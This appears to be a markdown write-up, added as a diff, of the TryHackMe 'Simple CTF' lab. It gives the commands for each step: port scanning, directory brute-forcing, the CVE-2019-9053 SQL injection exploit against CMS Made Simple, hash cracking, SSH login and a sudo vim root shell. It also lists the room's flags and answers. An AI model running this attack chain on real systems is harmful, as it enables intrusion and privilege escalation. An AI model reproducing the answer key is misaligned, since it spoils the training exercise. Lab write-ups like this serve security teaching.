@@ -1,0 +1,269 @@
+# Simple CTF — TryHackMe Writeup
+
+> **Platform:** TryHackMe  
+> **Room:** Simple CTF  
+> **Difficulty:** Easy  
+> **Tools Used:** nmap, gobuster, ExploitDB, hashcat, vim
+
+---
+
+## Table of Contents
+
+- [Overview](#overview)
+- [Reconnaissance](#reconnaissance)
+- [Enumeration](#enumeration)
+- [Exploitation — CVE-2019-9053 (SQLi)](#exploitation--cve-2019-9053-sqli)
+- [Password Cracking](#password-cracking)
+- [Initial Access via SSH](#initial-access-via-ssh)
+- [Privilege Escalation via vim](#privilege-escalation-via-vim)
+- [Flags](#flags)
+- [Q&A Summary](#qa-summary)
+
+---
+
+## Overview
+
+Simple CTF is a beginner-friendly TryHackMe room that walks through a full attack chain:
+
+1. Port scanning with nmap
+2. Web directory enumeration with gobuster
+3. SQL injection via CVE-2019-9053 (CMS Made Simple)
+4. Hash cracking with hashcat
+5. SSH login and privilege escalation using a misconfigured sudo rule on `vim`
+
+---
+
+## Reconnaissance
+
+### Nmap Scan
+
+```bash
+nmap -sC -sV -p- 10.10.158.205
+```
+
+**Flags explained:**
+- `-sC` — Run default scripts (e.g., banner grabbing, version detection helpers)
+- `-sV` — Detect service versions
+- `-p-` — Scan all 65535 ports
+
+**Results:**
+
+| Port | State | Service | Version |
+|------|-------|---------|---------|
+| 21   | open  | ftp     | vsftpd 3.0.3 |
+| 80   | open  | http    | Apache httpd 2.4.18 (Ubuntu) |
+| 2222 | open  | ssh     | OpenSSH 7.2p2 Ubuntu |
+
+**Key observations:**
+- FTP (port 21) allows anonymous login — worth checking but not the attack path here
+- HTTP (port 80) is running Apache — likely the main target
+- SSH is running on a **non-default port (2222)** rather than the standard port 22
+
+> **Q1: How many services are running under port 1000?**  
+> **Answer: 2** (FTP on 21, HTTP on 80)
+
+> **Q2: What is running on the higher port?**  
+> **Answer: SSH** (on port 2222)
+
+---
+
+## Enumeration
+
+### Gobuster — Web Directory Brute Forcing
+
+```bash
+gobuster dir -u http://10.10.158.205 -w /usr/share/wordlists/dirb/common.txt
+```
+
+Gobuster discovered a hidden path: `/simple`
+
+Navigating to `http://10.10.158.205/simple` reveals a **CMS Made Simple** installation. The version number (**2.2.8**) is visible at the bottom of the page.
+
+### Finding the Exploit
+
+Searching for "CMS Made Simple 2.2.8" on [ExploitDB](https://www.exploit-db.com) returns:
+
+- **Exploit:** [EDB-46635](https://www.exploit-db.com/exploits/46635)
+- **CVE:** CVE-2019-9053
+- **Type:** SQL Injection (unauthenticated, time-based blind)
+
+> **Q3: What's the CVE you're using against the application?**  
+> **Answer: CVE-2019-9053**
+
+> **Q4: To what kind of vulnerability is the application vulnerable?**  
+> **Answer: SQL Injection (SQLi)**
+
+---
+
+## Exploitation — CVE-2019-9053 (SQLi)
+
+CMS Made Simple versions prior to 2.2.10 are vulnerable to an **unauthenticated time-based SQL injection** in the News module via the `m1_idlist` parameter. This allows an attacker to extract usernames, email addresses, and password hashes without any authentication.
+
+### Running the Exploit
+
+```bash
+python 46635.py -u http://10.10.158.205/simple --crack -w /usr/share/wordlists/rockyou.txt
+```
+
+**Flags explained:**
+- `-u` — Target URL
+- `--crack` — Automatically attempt to crack the recovered password hash using a wordlist
+- `-w` — Path to the wordlist
+
+The exploit dumps the admin credentials including:
+- **Username:** mitch
+- **Password hash:** `0c01f4468bd75d7a84c7eb73846e8d96`
+- **Salt:** `1dac0d92e9fa6bb2`
+
+> **Q5: What's the password?**  
+> **Answer: secret** (cracked in the next step)
+
+---
+
+## Password Cracking
+
+Even if `--crack` doesn't work during the exploit, you can crack manually using **hashcat**.
+
+### Step 1 — Save the hash to a file
+
+```bash
+echo "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" > hash.txt
+```
+
+The format is `hash:salt` which matches hashcat's mode 20.
+
+### Step 2 — Crack with hashcat
+
+```bash
+hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+**Flags explained:**
+- `-m 20` — Hash mode 20 = `md5($salt.$pass)` — the salt is prepended before hashing
+- `hash.txt` — File containing the hash in `hash:salt` format
+- `rockyou.txt` — Wordlist to use for dictionary attack
+
+**Result:**
+
+```
+0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
+```
+
+**Cracked password: `secret`**
+
+---
+
+## Initial Access via SSH
+
+With the credentials obtained, log in via SSH on the non-standard port:
+
+```bash
+ssh mitch@10.10.158.205 -p 2222
+```
+
+Enter password: `secret`
+
+Once logged in:
+
+```bash
+$ ls
+user.txt
+
+$ cat user.txt
+G00d j0b, keep up!
+```
+
+### Checking for other users
+
+```bash
+$ cd /home
+$ ls
+mitch  sunbath
+```
+
+There is another user: **sunbath** — useful to note for further exploration.
+
+> **User Flag: `G00d j0b, keep up!`**
+
+---
+
+## Privilege Escalation via vim
+
+### Checking sudo permissions
+
+```bash
+$ sudo -l
+```
+
+Output:
+
+```
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+```
+
+The user `mitch` can run `vim` as root **without a password**. This is a classic privilege escalation misconfiguration.
+
+### Exploiting sudo vim
+
+```bash
+sudo vim -c ':!/bin/sh'
+```
+
+**Command breakdown:**
+- `sudo vim` — Opens vim with root privileges
+- `-c` — Tells vim to execute a command on startup (without opening an editor window interactively)
+- `':!/bin/sh'` — Inside vim, `:!` runs a shell command; `/bin/sh` spawns a shell — since vim is running as root, the shell inherits root privileges
+
+```bash
+# whoami
+root
+```
+
+You now have a root shell.
+
+### Getting the root flag
+
+```bash
+# cd /root
+# cat root.txt
+W3ll d0n3. You made it!
+```
+
+> **Root Flag: `W3ll d0n3. You made it!`**
+
+---
+
+## Flags
+
+| Flag | Value |
+|------|-------|
+| User Flag | `G00d j0b, keep up!` |
+| Root Flag | `W3ll d0n3. You made it!` |
+
+---
+
+## Q&A Summary
+
+| # | Question | Answer |
+|---|----------|--------|
+| 1 | How many services are running under port 1000? | 2 |
+| 2 | What is running on the higher port? | SSH |
+| 3 | What's the CVE you're using against the application? | CVE-2019-9053 |
+| 4 | To what kind of vulnerability is the application vulnerable? | SQLi |
+| 5 | What's the password? | secret |
+| 6 | Where can you login with the details obtained? | SSH |
+| 7 | What's the user flag? | G00d j0b, keep up! |
+| 8 | Is there any other user in the home directory? What's its name? | sunbath |
+| 9 | What can you leverage to spawn a privileged shell? | vim |
+| 10 | What's the root flag? | W3ll d0n3. You made it! |
+
+---
+
+## Key Takeaways
+
+- Always scan **all ports** (`-p-`), not just common ones — SSH was hidden on 2222
+- Directory enumeration is essential — the vulnerable CMS was only reachable via `/simple`
+- Outdated CMS versions are frequently vulnerable to well-documented CVEs
+- `sudo -l` is one of the first commands to run after gaining initial access
+- Giving a user sudo access to a text editor like `vim` is equivalent to giving them a root shell — avoid this in production environments
